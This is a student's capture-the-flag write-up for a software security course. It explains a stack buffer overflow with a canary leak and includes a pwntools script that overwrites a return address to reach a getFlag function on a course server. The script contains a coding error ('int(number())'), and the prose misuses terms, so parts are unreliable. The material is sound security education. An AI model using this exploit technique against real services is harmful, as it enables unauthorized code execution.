Made by Kasper Melheim

The vulnerability with this program is that we can perform buffer overflow to overwrite the 16 bits, aswell as use a offset and canaryVal to find the position where we want to insert our address.
The adress was found the same way as in task 2, by using objdump on the binary file and look for getFlag.
The offset we need to use was found by sending in various numbers to the program using gdb and run at a breakpoint on a specific line. 
When we combined the bufferoverflow, offset, canaryVal and the address, and sent it to the program, the flag was returned.

Code:

#Made my Kasper Melheim
#imports
from pwn import *

#host and port number
conn = remote('ctf21.softwaresecurity.no', 7002)

#receive data from program
conn.recv()

#offset and canaryVal
offset = b'16'
conn.sendline(offset)
number = conn.recv()
canaryVal = p64(int(number()))

#overflow the 16 bits
bufferoverflow = b'X'*(16+8)

#target address
target = p64(0x4007f7)

#data we will send to the program
data = bufferoverflow + canaryVal + b'X'*8 + target

#send data and flag will be returned
conn.sendline(data)
conn.recv()
conn.interactive()

